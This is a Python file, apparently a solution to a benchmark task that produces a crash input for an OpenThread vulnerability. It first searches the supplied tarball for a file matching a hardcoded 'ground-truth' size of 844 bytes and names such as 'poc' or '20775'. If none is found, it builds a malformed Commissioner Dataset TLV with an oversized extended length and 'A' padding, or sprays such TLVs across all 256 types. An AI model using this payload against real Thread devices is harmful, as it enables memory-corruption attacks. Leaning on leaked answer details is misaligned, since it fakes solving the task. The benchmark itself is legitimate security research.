import os
import tarfile
import re


class Solution:
    def _ascii_ratio(self, data: bytes) -> float:
        if not data:
            return 0.0
        printable = sum(32 <= b < 127 or b in (9, 10, 13) for b in data)
        return printable / len(data)

    def solve(self, src_path: str) -> bytes:
        members_info = []

        # Load tarball and cache reasonable-sized members
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                size = m.size
                # Skip extremely large files to save time/memory
                if size > 20 * 1024 * 1024:
                    continue
                f = tf.extractfile(m)
                if f is None:
                    continue
                data = f.read()
                info = {
                    "member": m,
                    "name": m.name,
                    "size": len(data),
                    "data": data,
                    "text": None,
                }
                # Try decoding as text for later hex search / pattern detection
                try:
                    info["text"] = data.decode("utf-8")
                except Exception:
                    info["text"] = None
                members_info.append(info)

        # 1) Exact match on ground-truth length (844 bytes)
        exact_844 = [info for info in members_info if info["size"] == 844]
        if exact_844:
            best_data = None
            best_score = float("-inf")
            for info in exact_844:
                name = os.path.basename(info["name"])
                name_lower = name.lower()
                data = info["data"]
                score = 0.0
                score += 1000.0  # exact size match
                if "20775" in name_lower:
                    score += 100.0
                if "poc" in name_lower:
                    score += 80.0
                if "crash" in name_lower:
                    score += 60.0
                if "testcase" in name_lower:
                    score += 40.0
                ascii_ratio = self._ascii_ratio(data)
                if ascii_ratio < 0.7:
                    score += 20.0
                else:
                    score -= 20.0
                # Penalize obvious text/source file extensions
                ext = os.path.splitext(name_lower)[1]
                if ext in (
                    ".c",
                    ".cc",
                    ".cpp",
                    ".h",
                    ".hpp",
                    ".hh",
                    ".md",
                    ".txt",
                    ".rst",
                    ".py",
                    ".sh",
                    ".java",
                    ".go",
                    ".rs",
                    ".js",
                    ".ts",
                    ".html",
                    ".xml",
                    ".json",
                    ".yaml",
                    ".yml",
                    ".toml",
                    ".ini",
                ):
                    score -= 80.0
                if "readme" in name_lower or "license" in name_lower:
                    score -= 200.0
                if score > best_score:
                    best_score = score
                    best_data = data
            if best_data is not None:
                return best_data

        # 2) Heuristic search for a binary PoC file
        best_data = None
        best_score = float("-inf")
        for info in members_info:
            data = info["data"]
            size = info["size"]
            if size == 0:
                continue
            name = os.path.basename(info["name"])
            name_lower = name.lower()
            ext = os.path.splitext(name_lower)[1]

            score = 0.0

            # Prefer sizes near 844
            diff = abs(size - 844)
            if diff <= 300:
                score += (300 - diff) * 0.4  # max ~120
            else:
                score -= 20.0

            # General size preference
            if 100 <= size <= 5000:
                score += 20.0
            elif size < 100 or size > 5000:
                score -= 20.0

            ascii_ratio = self._ascii_ratio(data)
            if ascii_ratio > 0.9:
                score -= 40.0
            elif ascii_ratio < 0.5:
                score += 10.0

            # Extension hints
            if ext in (".bin", ".raw", ".dat", ".data", ".packet", ""):
                score += 20.0
            if ext in (
                ".c",
                ".cc",
                ".cpp",
                ".h",
                ".hpp",
                ".hh",
                ".md",
                ".txt",
                ".rst",
                ".py",
                ".sh",
                ".java",
                ".go",
                ".rs",
                ".js",
                ".ts",
                ".html",
                ".xml",
                ".json",
                ".yaml",
                ".yml",
                ".toml",
                ".ini",
            ):
                score -= 40.0

            # Name hints
            keywords = (
                ("20775", 60.0),
                ("poc", 50.0),
                ("crash", 40.0),
                ("testcase", 40.0),
                ("payload", 20.0),
                ("trigger", 20.0),
                ("id_", 10.0),
            )
            for kw, val in keywords:
                if kw in name_lower:
                    score += val

            if "readme" in name_lower or "license" in name_lower:
                score -= 100.0

            if score > best_score:
                best_score = score
                best_data = data

        if best_data is not None and best_score >= 50.0:
            return best_data

        # 3) Search for hex-encoded PoC in text files
        best_hex_data = None
        best_hex_score = float("-inf")
        hex_token_re = re.compile(r"\b(?:0x)?([0-9a-fA-F]{2})\b")

        for info in members_info:
            text = info["text"]
            if text is None:
                continue
            name_lower = os.path.basename(info["name"]).lower()
            # Only consider likely PoC-related text files
            if not any(
                kw in name_lower
                for kw in ("poc", "crash", "case", "20775", "hex", "payload")
            ):
                continue
            if len(text) > 100000:
                continue

            tokens = hex_token_re.findall(text)
            if len(tokens) < 50:
                continue

            try:
                data = bytes(int(tok, 16) for tok in tokens)
            except ValueError:
                continue

            size = len(data)
            score = 0.0
            diff = abs(size - 844)
            if diff <= 400:
                score += (400 - diff) * 0.25  # closeness
            if size == 844:
                score += 80.0
            if "20775" in name_lower or "poc" in name_lower:
                score += 50.0

            if score > best_hex_score:
                best_hex_score = score
                best_hex_data = data

        if best_hex_data is not None and best_hex_score >= 50.0:
            return best_hex_data

        # 4) Construct a synthetic TLV-based PoC targeting the vulnerability

        # Try to locate the Commissioner Dataset TLV type constant in headers
        commissioner_type = None
        commissioner_type_from_header = False

        pattern_enum = re.compile(
            r"(kCommissionerDataset|OT_MESHCOP_TLV_COMMISSIONER_DATASET)\s*=\s*(0x[0-9a-fA-F]+|\d+)"
        )
        pattern_define = re.compile(
            r"#define\s+OT_MESHCOP_TLV_COMMISSIONER_DATASET\s+(0x[0-9a-fA-F]+|\d+)"
        )

        for info in members_info:
            text = info["text"]
            if text is None:
                continue
            m = pattern_enum.search(text)
            if m:
                val = m.group(2)
                try:
                    commissioner_type = int(val, 0)
                    commissioner_type_from_header = True
                    break
                except ValueError:
                    continue

        if commissioner_type is None:
            for info in members_info:
                text = info["text"]
                if text is None:
                    continue
                m = pattern_define.search(text)
                if m:
                    val = m.group(1)
                    try:
                        commissioner_type = int(val, 0)
                        commissioner_type_from_header = True
                        break
                    except ValueError:
                        continue

        # If still unknown, leave commissioner_type as None; we'll handle below.

        # We want PoC length close to 844; TLV header is 4 bytes for extended length TLVs.
        # So choose extended length 840 to get total size 844.
        ext_len = 840

        if commissioner_type_from_header and commissioner_type is not None:
            type_byte = commissioner_type & 0xFF
            header = bytes(
                [
                    type_byte,
                    0xFF,  # extended-length indicator
                    (ext_len >> 8) & 0xFF,
                    ext_len & 0xFF,
                ]
            )
            value = b"A" * ext_len
            return header + value

        # Last-resort fallback: commissioner type unknown.
        # Construct TLVs for all possible types (0-255) with extended length
        # so that whichever corresponds to Commissioner Dataset will trigger the bug.
        # Use a moderate extended length to keep overall PoC size manageable.
        fallback_ext_len = 64
        buf = bytearray()
        for t in range(256):
            header = bytes(
                [
                    t & 0xFF,
                    0xFF,
                    (fallback_ext_len >> 8) & 0xFF,
                    fallback_ext_len & 0xFF,
                ]
            )
            buf.extend(header)
            buf.extend(b"A" * fallback_ext_len)
        return bytes(buf)
